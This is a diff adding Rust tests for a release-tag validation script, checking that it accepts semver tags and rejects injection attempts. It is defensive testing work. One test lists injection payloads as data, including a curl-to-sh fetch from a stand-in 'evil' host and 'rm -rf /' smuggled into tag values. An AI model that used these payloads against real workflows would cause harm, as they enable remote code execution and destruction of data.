@@ -348,6 +348,91 @@ fn install_hooks_overwrites_with_force_flag() {
     );
 }
 
+// `scripts/release-validate-tag.sh` is invoked from `.github/workflows/release.yml`
+// after the tag is materialised from `inputs.tag` (workflow_dispatch) or from
+// the pushed `refs/tags/...` ref. The script is the single-source-of-truth for
+// what counts as a project tag; both call sites delegate to it so an injection
+// vector via `inputs.tag` cannot bypass validation.
+
+fn run_release_validate_tag(tag: &str) -> (i32, String, String) {
+    let output = Command::new("bash")
+        .arg(script("release-validate-tag.sh"))
+        .arg(tag)
+        .output()
+        .expect("invoke release-validate-tag.sh");
+    let code = output.status.code().unwrap_or(-1);
+    let stdout = String::from_utf8_lossy(&output.stdout).into_owned();
+    let stderr = String::from_utf8_lossy(&output.stderr).into_owned();
+    (code, stdout, stderr)
+}
+
+#[test]
+fn release_validate_tag_accepts_canonical_semver() {
+    let (code, _out, err) = run_release_validate_tag("v0.5.0");
+    assert_eq!(code, 0, "must accept v0.5.0; stderr: {err}");
+    let (code, _out, err) = run_release_validate_tag("v10.20.30");
+    assert_eq!(code, 0, "must accept v10.20.30; stderr: {err}");
+}
+
+#[test]
+fn release_validate_tag_accepts_pre_release_suffix() {
+    let (code, _out, err) = run_release_validate_tag("v0.5.0-rc.1");
+    assert_eq!(code, 0, "must accept pre-release suffix; stderr: {err}");
+    let (code, _out, err) = run_release_validate_tag("v1.0.0-beta");
+    assert_eq!(
+        code, 0,
+        "must accept short pre-release suffix; stderr: {err}"
+    );
+}
+
+#[test]
+fn release_validate_tag_rejects_empty_input() {
+    let (code, _out, err) = run_release_validate_tag("");
+    assert_ne!(code, 0, "must reject empty tag");
+    assert!(
+        err.contains("empty") || err.contains("does not match"),
+        "stderr must explain rejection: {err}"
+    );
+}
+
+#[test]
+fn release_validate_tag_rejects_shell_metacharacters() {
+    // The script-injection vector from the 2026-05-25 SEC-1 finding: a
+    // workflow_dispatch caller supplies a tag like `v0.1.0"; curl evil | sh; #`.
+    // Even though the workflow now passes the value via `env:` (so YAML
+    // expansion cannot smuggle the payload into the shell), defense in depth
+    // requires the validator to refuse the malformed form too.
+    let injections = [
+        "v0.1.0\"; curl https://evil/x | sh; #",
+        "v0.1.0; rm -rf /",
+        "v0.1.0$(echo pwned)",
+        "v0.1.0`echo pwned`",
+        "v0.1.0 && echo pwned",
+        "v0.1.0\nrm -rf /",
+    ];
+    for bad in injections {
+        let (code, _out, err) = run_release_validate_tag(bad);
+        assert_ne!(
+            code, 0,
+            "must reject injection payload `{bad}`; stderr: {err}"
+        );
+    }
+}
+
+#[test]
+fn release_validate_tag_rejects_missing_v_prefix() {
+    let (code, _out, err) = run_release_validate_tag("0.5.0");
+    assert_ne!(code, 0, "must require leading `v`; stderr: {err}");
+}
+
+#[test]
+fn release_validate_tag_rejects_short_or_partial_versions() {
+    for bad in ["v1", "v1.0", "v.1.2.3", "v1.2.3.4", "vfoo"] {
+        let (code, _out, err) = run_release_validate_tag(bad);
+        assert_ne!(code, 0, "must reject `{bad}`; stderr: {err}");
+    }
+}
+
 #[test]
 fn install_hooks_fails_outside_git_repo() {
     let dir = tempdir().unwrap();
